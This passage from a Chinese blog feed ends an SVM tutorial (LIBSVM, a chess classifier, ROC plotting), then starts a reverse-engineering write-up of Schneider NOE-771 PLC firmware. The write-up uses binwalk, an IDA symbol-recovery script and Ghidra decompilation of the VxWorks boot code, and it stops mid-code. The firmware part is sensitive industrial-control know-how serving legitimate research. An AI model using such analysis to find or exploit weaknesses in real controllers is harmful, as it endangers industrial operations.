Scale=[2^{-15},2^3]$ 中遍历求识别率的最大值。</li></ul><h3 id="LIBSVM"><a href="#LIBSVM" class="headerlink" title="LIBSVM"></a>LIBSVM</h3><p>LIBSVM 是台湾林智仁教授在 2001 年开发的一套支持向量机的库，可以很方便的对数据做分类或回归。由于 LIBSVM 程序小，运用灵活，输入参数少，并且是开源的，易于扩展，其成为目前国内应用最多的 SVM 的库。这里使用 Python 下的 libsvm 库进行测试：</p><pre><code class="bash">$ python3 -m pip install --user libsvm -U</code></pre><p>训练参数设置：<code>svmtrain(yTraining, xTraining, cmd)</code>，<code>cmd</code> 的参数设置如下：</p><ul><li><code>-s svm_type: set type of SVM (default 0)</code><ul><li><code>0 -- C-SVC (multi-class classification)</code></li><li><code>1 -- nu-SVC (multi-class classification)</code></li><li><code>2 -- one-class SVM</code></li><li><code>3 -- epsilon-SVR (regression)</code></li><li><code>4 -- nu-SVR (regression)</code></li></ul></li><li><code>-t kernel_type: set type of kernel function (default 2)</code><ul><li><code>0 -- linear</code></li><li><code>1 -- polynomial</code></li><li><code>2 -- radial basis function</code></li><li><code>3 -- sigmoid</code></li><li><code>4 -- precomputed kernel</code></li></ul></li><li><code>-c cost: set the parameter C of C-SVC, epsilon-SVR, and nu-SVR (default 1)</code></li><li><code>-g gamma: set gamma in kernel function (default 1/num_features)</code></li><li><code>-v n: n-fold cross validation mode</code></li></ul><p>先尝试用<a href="https://github.com/cjlin1/libsvm" target="_blank" rel="noopener">在 Github 上的项目</a>给的例子 <code>heart_scale</code> 熟悉一下基本的函数。大概可以分析出 libsvm 可以直接读取的训练样本的格式，第一列为标记（Label），后面的数据集以 <code>Index:Value</code> 的形式排列：</p><pre><code class="bash">$ head heart_scale+1 1:0.708333 2:1 3:1 4:-0.320755 5:-0.105023 6:-1 7:1 8:-0.419847 9:-1 10:-0.225806 12:1 13:-1-1 1:0.583333 2:-1 3:0.333333 4:-0.603774 5:1 6:-1 7:1 8:0.358779 9:-1 10:-0.483871 12:-1 13:1+1 1:0.166667 2:1 3:-0.333333 4:-0.433962 5:-0.383562 6:-1 7:-1 8:0.0687023 9:-1 10:-0.903226 11:-1 12:-1 13:1-1 1:0.458333 2:1 3:1 4:-0.358491 5:-0.374429 6:-1 7:-1 8:-0.480916 9:1 10:-0.935484 12:-0.333333 13:1-1 1:0.875 2:-1 3:-0.333333 4:-0.509434 5:-0.347032 6:-1 7:1 8:-0.236641 9:1 10:-0.935484 11:-1 12:-0.333333 13:-1-1 1:0.5 2:1 3:1 4:-0.509434 5:-0.767123 6:-1 7:-1 8:0.0534351 9:-1 10:-0.870968 11:-1 12:-1 13:1+1 1:0.125 2:1 3:0.333333 4:-0.320755 5:-0.406393 6:1 7:1 8:0.0839695 9:1 10:-0.806452 12:-0.333333 13:0.5+1 1:0.25 2:1 3:1 4:-0.698113 5:-0.484018 6:-1 7:1 8:0.0839695 9:1 10:-0.612903 12:-0.333333 13:1+1 1:0.291667 2:1 3:1 4:-0.132075 5:-0.237443 6:-1 7:1 8:0.51145 9:-1 10:-0.612903 12:0.333333 13:1+1 1:0.416667 2:-1 3:1 4:0.0566038 5:0.283105 6:-1 7:1 8:0.267176 9:-1 10:0.290323 12:1 13:1</code></pre><p>使用 <code>svm_read_problem</code> 读取标记和数据集，使用 <code>svm_train</code> 训练指定数据，并最后使用 <code>svm_predict</code> 进行测试数据：</p><pre><code class="python">#!/usr/bin/env python3from libsvm.svmutil import *y, x = svm_read_problem(&#39;./heart_scale&#39;) # 获取全部的标记和数据集m = svm_train(y[:200], x[:200], &#39;-c 4&#39;) # 对前200组数据进行训练，并采用p_label, p_acc, p_val = svm_predict(y[200:], x[200:], m) # 对200组之后所有的数据进行测试</code></pre><p>训练的效果如下，在剩下的 70 组数据中测试的正确率为 84.2857%：</p><pre><code class="bash">$ ./heart_scale.py*.*optimization finished, #iter = 257nu = 0.351161obj = -225.628984, rho = 0.636110nSV = 91, nBSV = 49Total nSV = 91Accuracy = 84.2857% (59/70) (classification)</code></pre><p>接下来是对兵王问题的训练和测试。这里的数据在读取时需要做一点处理，全部转换成数字。中间训练的过程就是寻找较为准确的 $C$ 和 $\gamma$ 的过程（归一化、缩小范围）。最后使用生成的模型进行测试：</p><pre><code class="python">#!/usr/bin/env python3from libsvm.svmutil import *from operator import itemgetterimport numpy as npimport randomdef readData(filename): # 读取数据    xApp = []    yApp = []    with open(filename, &#39;rb&#39;) as f:        data = f.readlines()    for l in data:        t = l.split(b&#39;,&#39;)        # 二分类问题        if t[-1].startswith(b&#39;draw&#39;):            y = 0 # 平局为0        else:            y = 1 # 胜出为1        del t[-1]        # 把字母转化为数字        xs = [int(c) if ord(c) &lt; 0x3a and ord(c) &gt; 0x2f else ord(c) - ord(&#39;a&#39;) for c in t]        xApp.append(xs)        yApp.append(y)    return yApp, xAppdef dealWithData(yApp, xApp, trainingDataLength): # 处理数据    xTraining = []    yTraining = []    xTesting = []    yTesting = []    idxs = list(range(len(xApp)))    random.shuffle(idxs) # 打乱数据    for i in range(trainingDataLength):        xTraining.append(xApp[idxs[i]])        yTraining.append(yApp[idxs[i]])    for i in range(trainingDataLength, len(xApp)):        xTesting.append(xApp[idxs[i]])        yTesting.append(yApp[idxs[i]])    avgX = np.mean(np.mat(xTraining), axis=0).tolist()[0] # 计算训练数据集各个维度的算术平均值    stdX = np.std(np.mat(xTraining), axis=0).tolist()[0] # 计算训练数据集各个维度的标准方差    print(&#39;[*] avgX = &#39; + str(avgX))    print(&#39;[*] stdX = &#39; + str(stdX))    # 样本归一化    for data in xTraining:        for i in range(len(data)):            data[i] = (data[i] - avgX[i]) / stdX[i]    for data in xTesting:        for i in range(len(data)):            data[i] = (data[i] - avgX[i]) / stdX[i]    return yTraining, xTraining, yTesting, xTestingdef trainingModel(label, data, modelFilename): # 训练模型    CScale = [-5, -3, -1, 1, 3, 5, 7, 9, 11, 13, 15]    gammaScale = [-15, -13, -11, -9, -7, -5, -3, -1, 1, 3]    maxRecognitionRate = 0    maxC = 0    maxGamma = 0    for C in CScale:        C_ = pow(2, C)        for gamma in gammaScale:            gamma_ = pow(2, gamma)            cmd = &#39;-t 2 -c &#39; + str(C_) + &#39; -g &#39; + str(gamma_) + &#39; -v 5 -q&#39;            recognitionRate = svm_train(label, data, cmd)            # 比较获取准确率最高的C和gamma            if recognitionRate &gt; maxRecognitionRate:                maxRecognitionRate = recognitionRate                maxC = C                maxGamma = gamma    n = 10    minCScale = 0.5 * (min(-5, maxC) + maxC)    maxCScale = 0.5 * (max(15, maxC) + maxC)    newCScale = np.arange(minCScale, maxCScale+1, (maxCScale-minCScale)/n)    print(&#39;[*] newCScale = &#39; + str(newCScale))    minGammaScale = 0.5 * (min(-15, maxGamma) + maxGamma)    maxGammaScale = 0.5 * (max(3, maxGamma) + maxGamma)    newGammaScale = np.arange(minGammaScale, maxGammaScale+1, (maxGammaScale-minGammaScale)/n)    print(&#39;[*] newGammaScale = &#39; + str(newGammaScale))    for C in newCScale:        C_ = pow(2, C)        for gamma in newGammaScale:            gamma_ = pow(2, gamma)            cmd = &#39;-t 2 -c &#39; + str(C_) + &#39; -g &#39; + str(gamma_) + &#39; -v 5 -q&#39;            recognitionRate = svm_train(label, data, cmd)            # 比较获取准确率最高的C和gamma            if recognitionRate &gt; maxRecognitionRate:                maxRecognitionRate = recognitionRate                maxC = C                maxGamma = gamma    # 使用最终确定的C和gamma训练模型    print(&#39;[*] maxC = &#39; + str(maxC))    print(&#39;[*] maxGamma = &#39; + str(maxGamma))    C = pow(2, maxC)    gamma = pow(2, maxGamma)    cmd = &#39;-t 2 -c &#39; + str(C) + &#39; -g &#39; + str(gamma)    model = svm_train(label, data, cmd)    svm_save_model(modelFilename, model)    return modelif __name__ == &#39;__main__&#39;:    yApp, xApp = readData(&#39;krkopt.data&#39;)    yTraining, xTraining, yTesting, xTesting = dealWithData(yApp, xApp, 5000)    if input(&#39;Train or not? (y/n) &#39;) == &#39;y&#39;:        model = trainingModel(yTraining, xTraining, &#39;krkopt.model&#39;)    else:        model = svm_load_model(&#39;krkopt.model&#39;)    yPred, accuracy, decisionValues = svm_predict(yTesting, xTesting, model)</code></pre><p>最后测试的结果大约为 99.4492%：</p><pre><code class="bash">$ ./testSVMChessLibSVM.py[*] avgX = [2.0886, 1.8438, 3.5566, 4.557, 3.9804, 4.4256][*] stdX = [0.9459122792309963, 0.9203268767128373, 2.291548917217361, 2.2831449800658565, 2.3259440749940588, 2.265582627052049]Train or not? (y/n) yCross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%...Cross Validation Accuracy = 89.9%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 90.08%Cross Validation Accuracy = 99.26%Cross Validation Accuracy = 99.32%Cross Validation Accuracy = 99.18%Cross Validation Accuracy = 98.56%Cross Validation Accuracy = 98.56%Cross Validation Accuracy = 95.46%Cross Validation Accuracy = 89.88%[*] newCScale = [ 3.  4.  5.  6.  7.  8.  9. 10. 11. 12. 13.][*] newGammaScale = [-10.   -9.1  -8.2  -7.3  -6.4  -5.5  -4.6  -3.7  -2.8  -1.9  -1.   -0.1]Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 90.62%Cross Validation Accuracy = 96.2%Cross Validation Accuracy = 98.5%Cross Validation Accuracy = 98.92%Cross Validation Accuracy = 98.7%...Cross Validation Accuracy = 98.28%Cross Validation Accuracy = 99.2%Cross Validation Accuracy = 99.24%Cross Validation Accuracy = 99.28%Cross Validation Accuracy = 99.34%Cross Validation Accuracy = 99.16%Cross Validation Accuracy = 98.94%Cross Validation Accuracy = 98.76%Cross Validation Accuracy = 98.76%Cross Validation Accuracy = 98.86%Cross Validation Accuracy = 97.9%[*] maxC = 11[*] maxGamma = -5...............................................................................................................*........................................................................................................................................................................*................................................................................................*optimization finished, #iter = 375498nu = 0.033157obj = -251795.371532, rho = -81.180115nSV = 228, nBSV = 110Total nSV = 228Accuracy = 99.4492% (22929/23056) (classification)</code></pre><h3 id="混淆矩阵"><a href="#混淆矩阵" class="headerlink" title="混淆矩阵"></a>混淆矩阵</h3><ul><li>TP（True Positive）：将正样本识别为正样本的数量（或概率）；</li><li>FN（False Negative）：将正样本识别为负样本的数量（或概率）；</li><li>FP（False Positive）：将负样本识别为正样本的数量（或概率）；</li><li>TN（True Negative）：将负样本识别为负样本的数量（或概率）。</li></ul><h4 id="ROC（Receiver-Operating-Charactor）曲线"><a href="#ROC（Receiver-Operating-Charactor）曲线" class="headerlink" title="ROC（Receiver Operating Charactor）曲线"></a>ROC（Receiver Operating Charactor）曲线</h4><p>ROC 曲线是一条横坐标 FP，纵坐标 TP 的曲线。四个概率 TP、FN、FP、TN 的关系：</p><ol><li>$TP+FN=1$；</li><li>$FP+TN=1$；</li><li>对同一个系统来说，若 $TP$ 增加，则 $FP$ 也增加；</li><li>在 FP 为 0 的情况下，TP 的值越高则系统性能越好。</li></ol><p>等错误率（Equal Error Rate）是两类错误 FP 和 FN 相等时候的错误率，可以直观地表示系统性能。以上面兵王问题画出的 ROC 曲线和 ERR 为例：</p><pre><code class="python">#!/usr/bin/env python3# ...import matplotlib.pyplot as plt# ...def drawROC(yTesting, decisionValues): # 绘制ROC曲线    values, labels = [list(x) for x in zip(*sorted(zip(decisionValues, yTesting), key=itemgetter(0)))]    truePositive = [0 for i in range(len(values) + 1)]    trueNegative = [0 for i in range(len(values) + 1)]    falsePositive = [0 for i in range(len(values) + 1)]    falseNegative = [0 for i in range(len(values) + 1)]    for i in range(len(values)):        if labels[i] == 1:            truePositive[0] += 1        else:            falsePositive[0] += 1    for i in range(len(values)):        if labels[i] == 1:            truePositive[i + 1] = truePositive[i] - 1            falsePositive[i + 1] = falsePositive[i]        else:            falsePositive[i + 1] = falsePositive[i] - 1            truePositive[i + 1] = truePositive[i]    truePositive = (np.array(truePositive) / truePositive[0]).tolist()    falsePositive = (np.array(falsePositive) / falsePositive[0]).tolist()    plt.xlabel(&#39;False Positive&#39;)    plt.ylabel(&#39;True Positive&#39;)    plt.plot(falsePositive, truePositive, color=&#39;blue&#39;) # ROC    plt.plot([1,0], [0,1], color=&#39;red&#39;) # EER    plt.legend([&#39;ROC&#39;, &#39;EER&#39;])    plt.show()if __name__ == &#39;__main__&#39;:    # ...    drawROC(yTesting, decisionValues)</code></pre><p><img src="/pics/Machine-Learning-SVM/4.png" srcset="/img/loading.gif" alt></p><h2 id="SVM-处理多分类问题"><a href="#SVM-处理多分类问题" class="headerlink" title="SVM 处理多分类问题"></a>SVM 处理多分类问题</h2><p>SVM 有三种方式处理多类问题，即类别大于 2 的问题：</p><ul><li>改造优化的目标函数和限制条件，使之能处理多类问题；</li><li>一类对其他类；</li><li>一类对另一类。</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>《机器学习》——周志华<br>浙江大学信电学院《机器学习》课程</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ml" scheme="blog.b3ale.cn/tags/ml/"/>
    
      <category term="svm" scheme="blog.b3ale.cn/tags/svm/"/>
    
  </entry>
  
  <entry>
    <title>施耐德140NOE77101固件逆向分析</title>
    <link href="blog.b3ale.cn/2020/07/05/%E6%96%BD%E8%80%90%E5%BE%B7140NOE77101%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>blog.b3ale.cn/2020/07/05/%E6%96%BD%E8%80%90%E5%BE%B7140NOE77101%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-07-05T03:39:07.000Z</published>
    <updated>2020-07-07T11:38:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>PLC 固件分析。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>分析的对象是施耐德昆腾系列 PLC 的 NOE-711 以太网模块的固件：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/1.png" srcset="/img/loading.gif" alt></p><p>进行逆向的固件是施耐德在 VxWorks 上进行的二次开发，所以分析过程中会涉及到很多操作系统中的知识。</p><blockquote><p>特别感谢 <a href="https://www.anquanke.com/member/141205" target="_blank" rel="noopener">Asa9ao 师傅</a>的文章。</p></blockquote><h1 id="Preliminary-Analysis"><a href="#Preliminary-Analysis" class="headerlink" title="Preliminary Analysis"></a>Preliminary Analysis</h1><p>首先用 Binwalk 分析一下文件格式（先使用 <code>binwalk -e</code> 提取文件，再对提取出的文件进行分析），可以看到固件采用的操作系统（PowerPC big-endian）、内核版本（VxWorks 5）、符号表（起始地址为 0x301E74）等相关信息：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/2.png" srcset="/img/loading.gif" alt></p><p>接下来载入 IDA，处理器选择 PowerPC big-endian 后直接加载：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/3.png" srcset="/img/loading.gif" alt></p><p>PPC 中共有 32 个通用寄存器，各个寄存器的用途见<a href="#PowerPC-寄存器">附录</a>。先在 IDA 中做一个简单的分析，看一下在 0x4C 处的一段汇编：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/4.png" srcset="/img/loading.gif" alt></p><p>先看前两条指令，<code>lis</code> 用于加载立即数，将 16 位整型 1 传至 r1 并左移 16 位，即将寄存器的第 17 位设为 1（可能是因为大端序）；<code>addi</code> 把 r1 的低 16 位加 0 后的结果再赋给 r1 的低 16 位。相当于将 r1 的值设置为 0x10000：</p><pre><code class="ppc">lis r1, 1addi r1, r1, 0</code></pre><p>接下来对 r3 做同样的操作，然后将 r1 的低 16 位减 0x10（开辟栈空间），最后 <code>b</code> 指令用于调用函数：</p><pre><code class="ppc">lis r3, 1addi r3, r3, 0addi r1, r1, -0x10b loc_1CD94</code></pre><p>根据对 r1 的操作可以判断出这里的一部分其实是对栈进行初始化，故固件的加载地址应该是前面为 r1 设置的 0x10000，则我们可以重新加载 IDA 并设置 ROM 和 RAM 的起始地址为 0x10000。接下来对符号表进行修复。用 010 Editor 打开固件，定位到符号表起始地址（之前 Binwalk 分析得到）。因为 VxWorks 5 的符号表比较特殊，16 字节为一组符号信息，分别表示符号字符串地址、符号所在地址、特殊标识（比如 0x0500 就是函数的意思）、0 填充位。根据 16 字节一组的规律，可以定位到 0x3293A4 为符号表的结尾：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/5.png" srcset="/img/loading.gif" alt></p><p>根据上面的信息，编写 IDA-Python 脚本对代码重新进行分析：</p><pre><code class="python">from idaapi import *loadAddress = 0x10000eaStart = 0x301E64 + loadAddresseaEnd = 0x3293A4 + loadAddressea = eaStartwhile ea &lt; eaEnd:    offset = 0    MakeStr(Dword(ea - offset), BADADDR)    sName = GetString(Dword(ea - offset), -1, ASCSTR_C)    print sName    if sName:        eaFunc = Dword(ea - offset + 4)        MakeName(eaFunc, sName)        MakeCode(eaFunc)        MakeFunction(eaFunc, BADADDR)    ea += 0x10</code></pre><p>脚本执行完成后，可以看到 IDA 通过符号表重新设置好了函数名：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/6.png" srcset="/img/loading.gif" alt></p><blockquote><p>如果遇到 <code>MakeStr</code> 函数报错，见<a href="https://bbs.pediy.com/thread-229574.htm" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><h1 id="How-VxWorks-System-Works"><a href="#How-VxWorks-System-Works" class="headerlink" title="How VxWorks System Works?"></a>How VxWorks System Works?</h1><p>经过上面的分析，已经对该固件有了初步的认识。接下来从 VxWorks 操作系统的角度来更进一步地了解固件。为了更好地分析，接下来转战 Ghidra，因为其支持 PPC 的反汇编。同时前面修复符号表的任务可以通过插件 <a href="https://github.com/PAGalaxyLab/vxhunter" target="_blank" rel="noopener">vxhunter</a> 来实现（具体操作见 README）。先顺着上面的分析，再看看 <code>_sysInit</code> 前面的部分，一开始的部分主要是 <code>isync</code> 指令（指令同步）：</p><pre><code class="ppc">mfmsr r3rlwinm r4, r3, 0, 17, 15rlwinm r4, r4, 0, 28, 25rlwinm r4, r4, 0, 26, 24mtmsr r4isync</code></pre><p>接下来对 r4 进行操作，主要是通过 <code>mtspr</code> 将特殊寄存器 <code>DC_CST</code> 的值设置为 0xC0000。<code>tlbia</code> 指令则对应快表（TLB）的相关操作：</p><pre><code class="ppc">lis r4, 0x400addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4lis r4, 0xA00addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4lis r4, 0xC00addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4tlbia</code></pre><p>然后看看这部分反编译的结果。大致上没有问题，就是 Ghidra 错把 r4 的值也当成了 <code>usrInit</code> 的参数：</p><pre><code class="cpp">void _sysInit(void){  instructionSynchronize();  TLBInvalidateAll();  usrInit(0,0xc000000);  return;}</code></pre><p>接下来就是 <code>usrInit</code> 函数：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/7.png" srcset="/img/loading.gif" alt></p><p>一开始的部分是 PPC 下的 Function Prologs。先通过 <code>stwu</code> 把 r1 的值存到 local_18+r1 的内存地址上；<code>mfspr</code> 将 LR 寄存器的值（记录函数返回地址）赋给 r0；接下来再将 r31 的值存到 local_4+r1 的内存地址上，再把 r0 的值放到 local_res4+r1 的内存地址上（local_res4 是正数，意味着把 r0 放到了栈底往上的部分，其实就是把函数返回地址存到栈上）；最后 <code>or</code> 将 r1 和自己按位或并把结果存入 r31，相当于 x86 下的 <code>mov r31, r1</code>：</p><pre><code class="ppc">stwu r1, local_18(r1)mfspr r0, LRstw r31, local_4(r1)stw r0, local_res4(r1)or r31, r1, r1</code></pre><p>下面的部分是一系列的函数调用，到最后是恢复堆栈以及 <code>blr</code> 返回到上一层函数：</p><pre><code class="ppc">stw r3, local_10(r31)lwz r3, local_10(r31)bl sysStartli r3, 0x1li r4, 0x1bl cacheLibInitbl excVecInitbl sysHwInitbl usrCacheEnablebl wvLibInitbl usrKernelInitlwz r11, 0x0(r1)=&gt;local_18lwz r0, 0x4(r11)mtspr LR, r0lwz r31, -0x4(r11)or r1, r11, r11blr</code></pre><p>反编译后得到大致的代码，接下来就主要根据反编译的代码来分析：</p><pre><code class="cpp">void usrInit(undefined4 param_1){  sysStart(param_1);  cacheLibInit(1,1);  excVecInit();  sysHwInit();  usrCacheEnable();  wvLibInit();  usrKernelInit();  return;}</code></pre><p>根据前面的分析，可以判断 <code>sysStart</code> 中传入的参数是 r3。首先调用 <code>bzero</code> 将两个参数（内存地址）之间的内存置 0；然后设置系统的启动类型 <code>sysStartType</code> 为传入的参数，其中启动类型包括有 BootRAM 启动和 ROM 启动，压缩式和非压缩式等；最后调用 <code>intVecBaseSet</code> 初始化系统的中断向量表的起始地址为 0：</p><pre><code class="cpp">void sysStart(undefined4 param_1){  bzero(&amp;_func_smObjObjShow,0x157914);  sysStartType = param_1;  intVecBaseSet(0);  return;}</code></pre><p>接下来再看看 <code>excVecInit</code>，总体上来说是在初始化中断向量表：</p><pre><code class="cpp">undefined4 excVecInit(void){  int *piVar1;  undefined4 *puVar2;  puVar2 = &amp;DAT_0030a488;  if (PTR_excExcHandle_0030a490 != (undefined *)0x0) {    do {      (*(code *)puVar2[1])(*puVar2,puVar2[2]);      piVar1 = puVar2 + 5;      puVar2 = puVar2 + 3;    } while (*piVar1 != 0);  }  return 0;}</code></pre><p>具体根据 <code>puVar2</code> 指向的地址来看。<code>puVar2[0]</code> 为下标、<code>puVar2[1]</code> 指向函数地址（指向 <code>excConnect</code>）、<code>puVar2[2]</code> 则指向另一个函数（指向 <code>excExcHandle</code>）。3 个双字一组（12 个字节），每次检查下一组的 <code>excExcHandle</code> 是否为 0，如果是则结束对中断向量表的初始化过程：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/8.png" srcset="/img/loading.gif" alt></p><p>接下来的 <code>sysHwInit</code> 用来将各种外设进行简单的初始化，同时让他们保持“沉默”。因为 CPU 通过中断来响应外设，但由于现在没完全建立起中断体，所以一旦产生中断，就会出现没有中断处理函数的情况，进而导致系统出错：</p><pre><code class="cpp">void sysHwInit(void){  uint uVar1;  int iVar2;  size_t sVar3;  undefined auStack24 [8];  int local_10;  local_10 = vxImmrGet();  MPC860ClocksInit();  CpicInit();  uVar1 = _GetMPC860Rev();  if (uVar1 &lt; 0x89a) {    *(undefined2 *)(local_10 + 0x952) = 0;    *(undefined2 *)(local_10 + 0x950) = 0;    *(undefined2 *)(local_10 + 0x954) = 0;    *(undefined4 *)(local_10 + 0xabc) = 0;    *(undefined4 *)(local_10 + 0xab8) = 0;    *(undefined2 *)(local_10 + 0xac2) = 0;    *(undefined2 *)(local_10 + 0x962) = 0;    *(undefined2 *)(local_10 + 0x960) = 0;    *(undefined2 *)(local_10 + 0x964) = 0;    *(undefined2 *)(local_10 + 0x972) = 0;    *(undefined2 *)(local_10 + 0x970) = 0;  }  else {    *(undefined2 *)(local_10 + 0x952) = 0xf830;    *(undefined2 *)(local_10 + 0x950) = 0x830;    *(undefined2 *)(local_10 + 0x954) = 0;    *(undefined2 *)(local_10 + 0x956) = 0x200;    *(undefined4 *)(local_10 + 0xabc) = 0x80080000;    *(undefined4 *)(local_10 + 0xab8) = 0x10013e;    *(undefined2 *)(local_10 + 0xac2) = 0;    *(undefined2 *)(local_10 + 0x962) = 0xc;    *(undefined2 *)(local_10 + 0x960) = 0x10;    *(undefined2 *)(local_10 + 0x964) = 0;  }  *(undefined4 *)(local_10 + 0xaec) = 0;  ppc860IntrInit(9);  sysSerialHwInit();  iVar2 = sysNvRamGet(auStack24,6,0xfffffffa);  if (iVar2 != -1) {    iVar2 = strcmp(auStack24,s_50MHZ_00205568);    if (iVar2 != 0) {      sVar3 = strlen(s_fec(0,0)_labcomm1:smooney_100MB\_00205570);      sysNvRamSet(s_fec(0,0)_labcomm1:smooney_100MB\_00205570,sVar3 + 1,0);      sysNvRamSet(s_50MHZ_00205568,6,0xfffffffa);    }    iVar2 = strncmp(sysBootLine,&amp;DAT_00205618,3);    if (iVar2 != 0) {      *sysBootLine = &#39;\0&#39;;    }  }  sysCpmEnetDisable(0);  sysCpmEnetIntDisable(0);  vxPowerModeSet(1);  MPC860Init();  return;}</code></pre><p>像 <code>usrCacheEnable</code> 这样类似 <code>xxxEnable</code> 的函数都是“使能”的意思（数字电路中的使能端）。只有使能了，这个固件才可以使用：</p><pre><code class="cpp">undefined4 usrCacheEnable(void){  cacheEnable(0);  cacheEnable(1);  AisysMmuCache();  return 0;}</code></pre><p>最后也是最关键的 <code>usrKernelInit</code>。前面 <code>xxxLibInit</code> 部分都是对函数库的初始化，<code>qInit</code> 以及 <code>workQInit</code> 是对队列的初始化；最后则调用了 <code>kernelInit</code> 函数：</p><pre><code class="cpp">void usrKernelInit(void){  undefined4 uVar1;  classLibInit();  taskLibInit();  qInit(&amp;readyQHead,qPriBMapClassId,&amp;readyQBMap,0x100);  qInit(&amp;activeQHead,qFifoClassId);  qInit(&amp;tickQHead,qPriListClassId);  workQInit();  uVar1 = sysMemTop();  kernelInit(usrRoot,20000,0x490d2c,uVar1,5000,0);  return;}</code></pre><p>在 <code>kernelInit</code> 函数中主要就是创建并执行了一个任务，同时设置了该任务的 TCB、栈、内存池等。这里创建的任务就是 <code>usrRoot</code>：</p><pre><code class="cpp">void kernelInit(undefined4 param_1,int param_2,int param_3,uint param_4,int param_5,               undefined4 param_6){  uint uVar1;  uint uVar2;  int iVar3;  int iVar4;  int iVar5;  undefined auStack552 [516];  rootMemNBytes = param_2 + 7U &amp; 0xfffffff8;  uVar1 = param_3 + 7U &amp; 0xfffffff8;  uVar2 = param_5 + 7U &amp; 0xfffffff8;  intLockLevelSet(param_6);  roundRobinOn = 0;  vxTicks = 0;  vxIntStackBase = uVar1 + uVar2;  vxIntStackEnd = uVar1;  bfill(uVar1,uVar2,0xee);  windIntStackSet(vxIntStackBase);  iVar3 = vxIntStackBase;  taskIdCurrent = (undefined *)0x0;  pRootMemStart = (param_4 &amp; 0xfffffff8) - rootMemNBytes;  iVar5 = rootMemNBytes - 0x220;  iVar4 = pRootMemStart + iVar5 + 0x18;  bfill(auStack552,0x200,0);  taskInit(iVar4,s_tRootTask_0022bf08,0,6,iVar4,iVar5,param_1,iVar3,pRootMemStart -iVar3,0,0,0,0,0,           0,0,0);  taskIdCurrent = auStack552;  rootTaskId = iVar4;  taskActivate(iVar4);  return;}</code></pre><h2 id="Create-a-new-task-——-usrRoot"><a href="#Create-a-new-task-——-usrRoot" class="headerlink" title="Create a new task —— usrRoot"></a>Create a new task —— <code>usrRoot</code></h2><p>在 <code>usrRoot</code> 中，调用了一系列函数对系统进行初始化，最终在 <code>usrAppInit</code> 中进入系统：</p><pre><code class="cpp">void usrRoot(undefined4 param_1,undefined4 param_2){  usrKernelCoreInit();  memPartLibInit(param_1,param_2);  memInit(param_1,param_2);  sysClkInit();  usrIosCoreInit();  usrKernelExtraInit();  usrIosExtraInit();  usrNetworkInit();  selectInit();  usrToolsInit();  cplusLibInit();  cplusDemanglerInit();  usrAppInit();  return;}</code></pre><p>接下来一个一个来看 <code>usrRoot</code> 中的函数。首先是 <code>usrKernelCoreInit</code>，主要作用是对一些功能进行初始化，sem 开头的代表信号量；wd 即 Watch Dog，用于监测系统有没有严重到无法恢复的错误，有的话将重启系统；msgQ 则是消息队列；taskHook 则是和 hook 相关的内容：</p><pre><code class="cpp">void usrKernelCoreInit(void){  semBLibInit();  semMLibInit();  semCLibInit();  msgQLibInit();  wdLibInit();  taskHookInit();  return;}</code></pre><p>接下来调用 <code>memPartLibInit</code> 和 <code>memInit</code> 初始化系统的内存堆，这之后就能正常地调用 malloc 和 free 了：</p><pre><code class="cpp">int memPartLibInit(undefined4 param_1,undefined4 param_2){  int iVar1;  if ((DAT_0030b8fc == 0) &amp;&amp;     (iVar1 = classInit(memPartClassId,0x44,0,memPartCreate,memPartInit,FUN_0018c634), iVar1 ==0))  {    *(undefined **)(memPartClassId + 0x24) = memPartInstClassId;    classInstrument();    memPartInit(&amp;DAT_0030b884,param_1,param_2);    DAT_0030b8fc = 1;  }  return -(uint)(DAT_0030b8fc == 0);}void memInit(undefined4 param_1,undefined4 param_2){  memLibInit();  memPartLibInit(param_1,param_2);  return;}</code></pre><p>然后调用 <code>sysClkInit</code> 初始化时钟，其中包括一些时钟中断系统的初始化：</p><pre><code class="cpp">void sysClkInit(void){  sysClkConnect(usrClock,0);  sysClkRateSet(0x3c);  sysClkEnable();  return;}</code></pre><p>剩下的部分主要再来看看网络的初始化。</p><h2 id="Dive-into-PLC’s-Network"><a href="#Dive-into-PLC’s-Network" class="headerlink" title="Dive into PLC’s Network"></a>Dive into PLC’s Network</h2><p>在 <code>usrNetworkInit</code> 函数中包括加载网络设备、启动网络设备等等工作：</p><pre><code class="cpp">void usrNetworkInit(void){  usrNetProtoInit();  muxLibInit();  usrEndLibInit();  usrNetworkBoot();  usrNetRemoteInit();  usrNetAppInit();  return;}</code></pre><p>首先 <code>usrNetProtoInit</code> 函数是对网络协议的初始化，包括有 UDP、TCP、ICMP 等常见的网络协议：</p><pre><code class="cpp">void usrNetProtoInit(void){  usrBsdSockLibInit();  hostTblInit();  usrIpLibInit();  udpLibInit(&amp;udpCfgParams);  udpShowInit();  tcpLibInit(&amp;tcpCfgParams);  